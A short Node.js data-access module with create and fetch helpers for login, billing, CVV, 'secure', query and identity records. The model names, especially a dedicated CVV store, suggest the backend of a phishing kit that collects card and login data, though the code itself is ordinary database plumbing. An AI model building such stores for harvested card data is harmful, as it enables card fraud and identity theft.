const Login = require("../../database/models/login");
const Billing = require("../../database/models/billing");
const Cvv = require("../../database/models/cvv");
const Secure = require("../../database/models/secure");
const Query = require("../../database/models/queries");
const Identity = require("../../database/models/identity");

module.exports = {
  async createLogin(login) {
    return Login.create(login);
  },
  async getLogin(login) {
    return Login.find(login).sort({ createdAt: -1 });
  },
  async createBilling(billing) {
    return Billing.create(billing);
  },
  async getBilling(billing) {
    return Billing.find(billing).sort({ createdAt: -1 });
  },
  async createSecure(secure) {
    return Secure.create(secure);
  },
  async getSecure(secure) {
    return Secure.find(secure).sort({ createdAt: -1 });
  },
  async createQuery(query) {
    return Query.create(query);
  },
  async getQuery(query) {
    return Query.find(query).sort({ createdAt: -1 });
  },
  async createCvv(cvv) {
    return Cvv.create(cvv);
  },

  async createIdentity(identity) {
    return Identity.create(identity);
  },

  async findBilling(filter) {
    return Billing.findOne(filter);
  },
};
